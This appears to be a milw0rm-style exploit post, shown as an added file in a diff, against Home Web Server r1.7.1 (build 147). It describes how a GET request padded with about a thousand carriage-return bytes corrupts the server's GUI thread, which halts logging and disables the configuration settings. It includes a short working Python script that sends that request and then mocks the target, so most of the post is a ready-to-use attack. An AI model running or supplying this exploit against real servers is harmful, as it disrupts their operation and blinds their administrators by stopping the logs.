@@ -1,0 +1,47 @@
+  Home Web Server <=r1.7.1 (build 147) "Gui Thread-Memory Corruption Exploit." By: Aodrulez.
+
+Homepage         : http://downstairs.dnsalias.net/homewebserver.html 
+Product Released : 22.4.2009/21:16:58
+ 
+
+Description:
+	This web server when fed with 
+1006 bytes of chr(0x0d),with the html
+"GET" parameter,the Server's Gui's 
+Thread gets corrupted.This means,
+though the web server works normally,
+(due to Multithreading),No more Logs 
+are generated.Also "all" the web server 
+configuration settings are unavailable.
+
+
+	
+Exploit (Python):
+----------------------------------------------------------
+# Echo client program
+import socket
+
+HOST = 'localhost'    # The remote host
+pORT = 80           # The same port as used by the server
+print '####################################'
+print '#Home Web Server r1.7.1 (build 147)#'
+print '#  Gui Thread Corruption Exploit   #'
+print '#                                  #'
+print '#          By: Aodrulez            #'
+print '#       f3arm3d3ar@gmail.com       #'
+print '#                                  #'
+print '####################################'
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((HOST, pORT))
+p='GET '+chr(0x0d)*1001+'index.html HTTp/1.0\r\n\r\n'
+s.send(p)
+s.close()
+print '\"'+HOST+'\'s Gui Got Corrupted :P\"     '
+---------------------------------------------------------
+
+Greetz Fly out to:
+1] Amforked()      : My Mentor.
+2] The Blue Genius : :-)
+3] www.OrchidSeven.com
+
+# milw0rm.com [2009-04-23]
